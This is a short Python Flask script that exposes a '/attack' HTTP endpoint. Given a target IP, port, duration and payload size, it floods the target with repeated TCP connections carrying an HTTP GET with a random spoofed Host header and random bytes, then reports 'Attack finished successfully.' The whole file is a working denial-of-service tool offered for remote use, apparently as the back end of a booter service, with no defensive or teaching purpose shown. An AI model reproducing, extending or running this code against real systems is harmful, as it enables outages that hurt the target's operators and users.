from flask import Flask, jsonify, request
from contextlib import suppress
import socket
import random
import os
import time  # Import the time module

app = Flask(__name__)

@app.route('/attack', methods=['POST'])
def start_attack():
    data = request.get_json()
    num_bytes = data.get('payload', 1024)
    time_duration = int(data.get('time', 60))  # Rename attack_num to time for clarity
    target_ip = data.get('ip', "0.0.0.0")
    target_port = int(data.get('port', 80))

    start_time = time.time()  # Record the start time of the attack

    def attack():
        while True:  # Run indefinitely until stopped
            if time.time() - start_time >= time_duration:  # Check if the attack duration has elapsed
                break  # Exit the loop if the time is up
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, int(target_port)))
            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            host_header = f"Host: {fake_ip}\r\n"
            payload = f"GET / HTTP/1.1\r\n{host_header}\r\n"
            s.send(payload.encode())
            s.send(os.urandom(int(num_bytes)))
            s.close()

    for _ in range(int(data.get('threads', 10))):
        with suppress(Exception):
            attack()
    
    # Sleep for the remaining time if needed
    
    # Return success message
    return jsonify({'success': True, 'message': 'Attack finished successfully.'})

if __name__ == '__main__':
    app.run(debug=True)
